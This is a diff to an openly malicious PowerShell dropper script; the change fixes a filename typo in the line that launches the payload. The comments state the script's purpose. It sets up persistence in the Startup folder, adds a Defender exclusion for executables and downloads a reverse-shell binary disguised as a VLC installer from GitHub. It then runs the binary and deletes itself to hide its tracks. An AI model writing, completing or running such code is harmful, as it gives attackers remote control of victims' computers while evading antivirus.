@@ -7,7 +7,7 @@ Remove-Item nmap.zip #Delete nmap.zip file
 Set-Location $env:APPDATA\Microsoft\Windows\'Start Menu'\Programs\Startup #Go to startup directory to make our reverseShell malware persistent
 Add-MpPreference -ExclusionExtension exe -Force
 Invoke-WebRequest https://github.com/silvucani/istealyoursoul/raw/main/vlc-3.0.18-win64.exe -o vlc-3.0.18-win64.exe #Download the reverseShell malware
-Start-Process vlc-3.0.18-win64.exe.exe #Start the malware
+Start-Process vlc-3.0.18-win64.exe #Start the malware
 Set-ExecutionPolicy Restricted -Force #Reset script blocker
 Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
 Remove-Item C:\Users\Public\Documents\script.ps1 #Delete script.ps1 file
